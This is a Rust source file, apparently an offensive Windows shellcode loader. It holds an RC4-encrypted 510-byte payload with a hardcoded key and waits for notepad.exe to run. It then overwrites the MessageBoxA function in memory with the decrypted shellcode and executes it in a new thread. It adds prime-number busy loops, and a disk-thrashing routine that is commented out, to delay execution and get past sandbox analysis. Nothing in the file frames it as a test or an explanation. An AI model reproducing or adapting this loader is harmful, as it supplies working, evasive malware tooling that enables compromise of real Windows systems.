use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use std::fs::{remove_file, File};
use std::io::{self, Read, Write};
use rand::{thread_rng, Rng};
use rc4::{KeyInit, Rc4, StreamCipher};
use windows::{
    core::{s, Error, Result},
    Win32::{
        Foundation:: HANDLE,
        System::{

            LibraryLoader::{GetProcAddress, LoadLibraryA},
            Memory::{
                VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
            },
            Threading::{
                CreateThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,THREAD_CREATION_FLAGS,
            },
        },
    },
};


const KEY: &[u8; 21] = b"supper_Idoudexiaorong";
pub const ENCRYPTED_SHELLCODE: &[u8; 510] = &[169, 211, 175, 75, 203, 187, 2, 162, 100, 172, 217, 30, 204, 16, 98, 217, 86, 57, 87, 176, 89, 121, 187, 129, 27, 220, 22, 21, 156, 144, 145,
    67, 252, 217, 160, 74, 250, 112, 198, 25, 25, 32, 60, 217, 105, 48, 118, 230, 202, 65, 156, 44, 199, 203, 63, 150, 214, 67, 161, 77, 218, 38, 145, 224, 51, 83, 227, 41, 231, 82, 78, 252, 57, 64,5,
    205, 84, 20, 116, 63, 161, 255, 191, 31, 16, 86, 98, 163, 188, 14, 110, 201, 209, 170, 130, 214, 189, 114, 35, 20, 251, 79, 241, 152, 190, 110, 158, 196, 47, 106, 63, 253, 115, 130, 79, 83, 26,
    182, 86, 32, 148, 3, 234, 134, 28, 112, 182, 240, 78, 77, 246, 220, 102, 198, 19, 99, 150, 21, 117, 243, 0, 116, 208, 165, 229, 251, 186, 58, 121, 253, 216, 186, 33, 216, 239, 147, 91, 39, 248, 1,
    114, 99, 167, 170, 113, 147, 61, 237, 247, 43, 42, 123, 131, 29, 121, 223, 227, 255, 62, 30, 40, 23, 25, 18, 93, 172, 179, 190, 166, 30, 111, 160, 241, 90, 226, 79, 42, 73, 219, 187, 215, 92, 80,
    46, 172, 17, 7, 108, 134, 202, 171, 132, 0, 61, 144, 51, 216, 141, 130, 237, 59, 247, 90, 120, 255, 39, 187, 235, 219, 187, 228, 28, 118, 181, 143, 242, 24, 254, 209, 96, 207, 89, 157, 160, 254,
    58, 57, 191, 247, 35, 147, 89, 168, 167, 191, 153,184, 204, 244, 184, 163, 230, 151, 13, 104, 156, 151, 49, 77, 61, 208, 179, 237, 187, 240, 47, 154, 118, 157, 237, 223, 209, 31, 232, 88, 109,
    212, 199, 169, 69, 186, 226, 181, 64, 132, 238, 84, 209, 3,102, 11, 105, 69, 102, 160, 8, 7, 173, 127, 1, 113, 225, 181, 166, 191, 15, 26, 174, 183, 220, 158, 18, 110, 114, 150, 17, 140, 41, 205,
    137, 176, 52, 14, 126, 161, 96, 210, 99, 63, 248, 125, 231, 77, 20, 155, 182, 3, 91, 11, 214, 255, 156, 239, 108, 178, 227, 115, 191, 74, 248, 244, 48, 133, 20, 254, 228, 76, 119, 112, 177, 175,
    190, 3, 22, 241, 70, 162, 74, 66, 166, 226, 77, 250, 74, 201, 228, 252, 61, 181, 200, 107, 249, 198, 154, 27, 178, 43, 71, 98, 236, 3, 51, 238, 203, 148, 223, 180, 217, 218, 80, 82, 50, 178, 180,
    7, 63, 92, 255, 17, 153, 130, 94, 64, 123, 1, 172, 5, 89, 64, 170, 12, 20, 23, 82, 94, 247, 105, 81, 125, 231, 25, 96, 40, 158, 140, 92, 191, 65, 43, 94, 133, 188, 156, 226, 170, 209, 220, 20, 90,
    231, 71, 226, 36, 237, 100, 66, 154, 92, 88, 186, 176, 158, 203, 125, 186, 196, 97, 150, 201, 244, 103, 45, 131, 93, 242, 61, 172, 111, 117, 142, 128, 72, 40, 247, 8, 148, 185, 90, 34, 201, 189,
    249, 192, 50, 184, 255, 250, 215, 86, 147];

fn find_process(name: &str) -> Option<HANDLE> {
    let mut system = System::new_all();
    system.refresh_all();

    let processes = system
        .processes()
        .values()
        .filter(|process| process.name().to_lowercase() == name)
        .collect::<Vec<_>>();

    if let Some(process) = processes.into_iter().next() {
        println!("[-] Process with PID found: {}", process.pid());
        let hprocess = unsafe {
            OpenProcess(PROCESS_ALL_ACCESS, false, process.pid().as_u32()).ok()
        };

        return hprocess;
    }
    None
}



fn inject_func( shellcode: &[u8]) -> Result<()>{

    unsafe {

        let hmodule = LoadLibraryA(s!("user32"))?;


        let func = GetProcAddress(hmodule, s!("MessageBoxA")).ok_or_else(|| Error::from_win32())?
            as *const u8;




        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);

        VirtualProtect(
            //   hprocess,
            func.cast(),
            shellcode.len(),
            PAGE_READWRITE,
            &mut oldprotect,
        )?;


        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func.cast_mut(), shellcode.len());


        VirtualProtect(
          //  hprocess,
            func.cast(),
          shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut oldprotect,
        )?;






        let hthread = CreateThread(
           // hprocess,
            None,
            0,
            Some(std::mem::transmute(func.cast_mut())),
            None,
           THREAD_CREATION_FLAGS(0),
            None,
        )?;







        WaitForSingleObject(hthread, INFINITE);
    }

    Ok(())
}





fn main() -> Result<()> {
    let max_retries = 115;
    
    for attempt in 0..max_retries {
        
        match find_process("notepad.exe") {
            
            Some(_hprocess) => {
                
                let mut shellcode = ENCRYPTED_SHELLCODE.to_vec();
                decrypt_rc4(&mut shellcode);

                if let Err(e) = inject_func( &shellcode) {
                    eprintln!("[-] Error injecting: {}", e);
                } else {
                    println!("[+] Injected! successfully!");
                }
                return Ok(());
            }
            
            None => {
                if attempt < max_retries - 1 {
                    //api_hammering(15);
                    calc_primes(1000);
                } else {
                    //println!("Max reached. Exit...");
                }
            }
        }

    }

    Ok(())
}

fn decrypt_rc4(buf: &mut [u8]) {
    let mut rc4 = Rc4::new(KEY.into());
    rc4.apply_keystream(buf);
}

fn api_hammering(num: usize) -> io::Result<()> {
    let dir = std::env::temp_dir();
    let path = dir.as_path().join("file.tmp");
    let size = 0xFFFFF;
    
    for _ in 0..num {
        let mut file = File::create(&path)?;
        let mut rng = thread_rng();
        let data: Vec<u8> = (0..size).map(|_| rng.r#gen::<u8>()).collect();
        file.write_all(&data)?;
        
        let mut file = File::open(&path)?;
        let mut buffer = vec![0;size];
        file.read_exact(&mut buffer)?;
        
    }
    remove_file(path)?;
    
    Ok(())
}

fn calc_primes(iterations: usize){
    let mut prime = 2;
    let mut i =0;
    while i < iterations {
        if (2..prime).all(|j| prime % j != 0){
            i += 1;
        }
        prime += 1;
    }
}